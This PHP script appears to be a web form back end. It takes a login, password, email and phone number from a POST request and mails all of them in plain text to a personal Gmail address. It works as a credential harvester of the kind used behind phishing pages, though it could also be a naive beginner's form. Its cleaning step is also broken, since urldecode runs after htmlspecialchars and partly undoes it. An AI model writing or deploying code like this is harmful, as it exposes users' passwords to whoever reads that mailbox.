<?php

    $login = $_POST['login'];
    $pass = $_POST['pass'];
    $email = $_POST['email'];
    $tel = $_POST['tel'];

    $login = htmlspecialchars($login); //Преобразование в сущности
    $pass = htmlspecialchars($pass);
    $email = htmlspecialchars($email);
    $tel = htmlspecialchars($tel);

    $login = urldecode($login);//декодирование юрл
    $pass = urldecode($pass);
    $email = urldecode($email);
    $tel = urldecode($tel);

    $login = trim($login);//удаление пробельніх символов с обоих сторон
    $pass = trim($pass);
    $email = trim($email);
    $tel = trim($tel);


    //отправляем данные

    if(mail("kir260302@gmail.com",
        "Новое письмо с сайта",
        "Логин: ".$login."\n".
        "Пароль: ".$pass."\n".
        "Email: ".$email."\n".
        "Телефон: ".$tel,
        "From: no-reply@mydomain.ua \r\n")
    
    ){
        echo('Письмо успешно отправлено!');
    }

    else{
        echo('Есть ошибки! Проверьте данные...');
    }
?>